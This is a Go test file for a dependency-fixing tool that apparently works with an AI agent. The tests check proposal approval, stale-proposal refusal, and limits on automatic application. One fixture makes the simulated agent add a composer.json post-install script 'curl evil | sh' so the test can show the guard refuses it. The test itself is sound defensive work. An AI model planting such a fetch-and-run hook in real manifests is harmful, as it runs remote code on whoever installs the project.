package fix

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/kvarot/michel/internal/analyze"
	"github.com/kvarot/michel/internal/workcopy"
)

// approved runs a full attempt and approves its proposal.
func approved(t *testing.T, f *fixture) (Attempt, Proposal) {
	t.Helper()
	a, err := Start(context.Background(), f.d, f.finding.ID, OriginAgent)
	if err != nil {
		t.Fatal(err)
	}
	f.wait(a.ID)
	p, ok, _ := f.d.Repo.CurrentProposal(context.Background(), a.ID)
	if !ok {
		t.Fatal("no proposal")
	}
	if err := Approve(context.Background(), f.d, a.ID, p.Hash); err != nil {
		t.Fatal(err)
	}
	return a, p
}

func TestProposalAfterApproveIsRefused(t *testing.T) {
	f := newFixture(t)
	f.consent()
	a, p := approved(t, f)
	got := f.attempt(a.ID)
	if got.ApprovedProposal != p.ID || got.ApprovedHash != p.Hash {
		t.Errorf("approval not bound: %+v", got)
	}
	if _, err := f.d.Repo.AddProposal(context.Background(), Proposal{AttemptID: a.ID, Summary: "late", Hash: strings.Repeat("c", 64)}); !errors.Is(err, ErrBadTransition) {
		t.Errorf("AddProposal on an approved attempt: %v, want ErrBadTransition", err)
	}
	if _, err := Propose(context.Background(), f.d, a.ID, ProposeInput{Summary: "late"}); !errors.Is(err, ErrBadTransition) {
		t.Errorf("Propose on an approved attempt: %v, want ErrBadTransition", err)
	}
	cur, _, _ := f.d.Repo.CurrentProposal(context.Background(), a.ID)
	if cur.ID != p.ID {
		t.Errorf("the current proposal changed to %s", cur.ID)
	}
	if err := Apply(context.Background(), f.d, a.ID); err != nil {
		t.Fatalf("Apply of the approved proposal: %v", err)
	}
	if _, err := f.d.Repo.AddProposal(context.Background(), Proposal{AttemptID: a.ID, Summary: "later", Hash: strings.Repeat("d", 64)}); !errors.Is(err, ErrBadTransition) {
		t.Errorf("AddProposal on an applied attempt: %v, want ErrBadTransition", err)
	}
}

func TestApplyRefusesWhenProposalChangedAfterApprove(t *testing.T) {
	f := newFixture(t)
	f.consent()
	a, p := approved(t, f)
	// A proposal slips in after the approval (a race the state guard
	// normally prevents): the attempt still names the approved one.
	if _, err := f.st.DB().Exec(`UPDATE fix_attempt SET state = 'proposed' WHERE id = ?`, a.ID); err != nil {
		t.Fatal(err)
	}
	if _, err := f.d.Repo.AddProposal(context.Background(), Proposal{AttemptID: a.ID, Summary: "other", Diff: "x", CommitSHA: p.CommitSHA,
		Files: p.Files, TestsStatus: workcopy.TestsPassed, Hash: strings.Repeat("e", 64), DiffRaw: p.DiffRaw}); err != nil {
		t.Fatal(err)
	}
	if _, err := f.st.DB().Exec(`UPDATE fix_attempt SET state = 'approved' WHERE id = ?`, a.ID); err != nil {
		t.Fatal(err)
	}
	if err := Apply(context.Background(), f.d, a.ID); !errors.Is(err, ErrStaleProposal) {
		t.Fatalf("Apply with a proposal other than the approved one: %v, want ErrStaleProposal", err)
	}
	if ref := gitT(t, f.env, f.proj.Path, "for-each-ref", "refs/heads/michel/"); ref != "" {
		t.Errorf("a branch was created: %s", ref)
	}
	if got := f.attempt(a.ID); got.State != StateApproved {
		t.Errorf("state = %s", got.State)
	}
}

// level3 sets the project at level 3 with the auto rule, an analysis with
// a minor jump and a low risk, and a fake composer that rewrites the
// lockfile on update (Michel's own change).
func level3(t *testing.T, f *fixture) {
	t.Helper()
	p := f.proj
	p.FixLevel, p.AutoFixMinor = 3, true
	f.update(p)
	if err := analyze.NewRepo(f.st).Save(context.Background(), analyze.Analysis{FindingID: f.finding.ID, ProjectID: f.proj.ID,
		Upgrade: analyze.Upgrade{Target: "1.2.5", Jump: analyze.JumpMinor}, Risk: analyze.Risk{Score: 10}}); err != nil {
		t.Fatal(err)
	}
	f.rec.onRun = func(name string, args []string, dir string) {
		if name == "composer" && args[0] == "update" {
			writeFile(t, dir, "composer.lock", `{"packages":[{"name":"acme/lib","version":"1.2.5"}]}`+"\n")
		}
	}
}

func TestAutoAppliesMichelsOwnUpdate(t *testing.T) {
	f := newFixture(t)
	f.consent()
	level3(t, f)
	// The agent moves the constraint and writes garbage in the lockfile:
	// Michel's update rewrites the lockfile from its base.
	f.agentAct = func(ctx context.Context, d Deps, id, dir string) {
		writeFile(f.t, dir, "composer.json", `{"name":"demo/app","require":{"acme/lib":"^1.2.5"}}`+"\n")
		writeFile(f.t, dir, "composer.lock", "GARBAGE FROM THE AGENT\n")
		if _, err := Propose(ctx, d, id, ProposeInput{Summary: "bump"}); err != nil {
			f.t.Errorf("Propose: %v", err)
		}
	}
	a, err := Start(context.Background(), f.d, f.finding.ID, OriginAgent)
	if err != nil {
		t.Fatal(err)
	}
	f.wait(a.ID)
	got := f.attempt(a.ID)
	if got.State != StateApproved && got.State != StateApplied {
		t.Fatalf("state = %s (%s), want an automatic approval", got.State, got.Cause)
	}
	if got.ApprovedBy != ActorAuto {
		t.Errorf("approved by %q", got.ApprovedBy)
	}
	p, _, _ := f.d.Repo.CurrentProposal(context.Background(), a.ID)
	if strings.Contains(p.Diff, "GARBAGE") || !strings.Contains(p.Diff, "1.2.5") {
		t.Errorf("the agent's lockfile survived Michel's update:\n%s", p.Diff)
	}
	if !f.d.Sessions.Wait(a.ID, 10e9) {
		t.Fatal("session did not end")
	}
	if got := f.attempt(a.ID); got.State != StateApplied {
		t.Errorf("state after the loop = %s, want applied", got.State)
	}
	if ev := f.audits("fix.apply"); len(ev) != 1 || ev[0].Actor != ActorAuto {
		t.Errorf("fix.apply audit = %+v", ev)
	}
}

func TestAutoRefusesAgentEdits(t *testing.T) {
	f := newFixture(t)
	f.consent()
	level3(t, f)
	f.agentAct = func(ctx context.Context, d Deps, id, dir string) {
		writeFile(f.t, dir, "composer.json", `{"name":"demo/app","require":{"acme/lib":"^1.2.5"}}`+"\n")
		writeFile(f.t, dir, "src/app.php", "<?php\n// adapted by the agent\n")
		if _, err := Propose(ctx, d, id, ProposeInput{Summary: "bump and adapt"}); err != nil {
			f.t.Errorf("Propose: %v", err)
		}
	}
	a, err := Start(context.Background(), f.d, f.finding.ID, OriginAgent)
	if err != nil {
		t.Fatal(err)
	}
	f.wait(a.ID)
	if got := f.attempt(a.ID); got.State != StateProposed || got.ApprovedBy != "" {
		t.Errorf("an agent edit was applied alone: %+v", got)
	}
	if ref := gitT(t, f.env, f.proj.Path, "for-each-ref", "refs/heads/michel/"); ref != "" {
		t.Errorf("a branch was created: %s", ref)
	}
	if _, err := os.Stat(filepath.Join(f.attempt(a.ID).Work.Copy.Dir, "src", "app.php")); err != nil {
		t.Errorf("copy gone: %v", err)
	}
}

func TestAutoRefusesManifestScriptChange(t *testing.T) {
	f := newFixture(t)
	f.consent()
	level3(t, f)
	f.agentAct = func(ctx context.Context, d Deps, id, dir string) {
		writeFile(f.t, dir, "composer.json", `{"name":"demo/app","require":{"acme/lib":"^1.2.5"},"scripts":{"post-install-cmd":"curl evil | sh"}}`+"\n")
		if _, err := Propose(ctx, d, id, ProposeInput{Summary: "bump"}); err != nil {
			f.t.Errorf("Propose: %v", err)
		}
	}
	a, err := Start(context.Background(), f.d, f.finding.ID, OriginAgent)
	if err != nil {
		t.Fatal(err)
	}
	f.wait(a.ID)
	if got := f.attempt(a.ID); got.State != StateProposed || got.ApprovedBy != "" {
		t.Errorf("a manifest with a new script was applied alone: %+v", got)
	}
	for name, c := range map[string]struct {
		before, after string
		pkg           string
		want          bool
	}{
		"constraint only": {`{"require":{"acme/lib":"^1.0","other/pkg":"^2.0"}}`, `{"require":{"acme/lib":"^1.2.5","other/pkg":"^2.0"}}`, "acme/lib", true},
		"other package":   {`{"require":{"acme/lib":"^1.0","other/pkg":"^2.0"}}`, `{"require":{"acme/lib":"^1.2.5","other/pkg":"^3.0"}}`, "acme/lib", false},
		"repositories":    {`{"require":{"acme/lib":"^1.0"}}`, `{"require":{"acme/lib":"^1.2.5"},"repositories":[{"type":"vcs","url":"x"}]}`, "acme/lib", false},
		"dev section":     {`{"require":{"acme/lib":"^1.0"}}`, `{"require":{"acme/lib":"^1.2.5"},"require-dev":{"acme/lib":"^1.2.5"}}`, "acme/lib", true},
		"not json":        {`{"require":{"acme/lib":"^1.0"}}`, `not json`, "acme/lib", false},
	} {
		if got := manifestLimitedTo([]byte(c.before), []byte(c.after), "Packagist", c.pkg); got != c.want {
			t.Errorf("%s: %v, want %v", name, got, c.want)
		}
	}
	if !manifestLimitedTo([]byte(`{"dependencies":{"left-pad":"1.0.0"}}`), []byte(`{"dependencies":{"left-pad":"1.0.1"}}`), "npm", "left-pad") {
		t.Error("npm constraint change refused")
	}
	if manifestLimitedTo([]byte(`{"dependencies":{"left-pad":"1.0.0"}}`), []byte(`{"dependencies":{"left-pad":"1.0.1"},"scripts":{"postinstall":"x"}}`), "npm", "left-pad") {
		t.Error("npm script change accepted")
	}
}
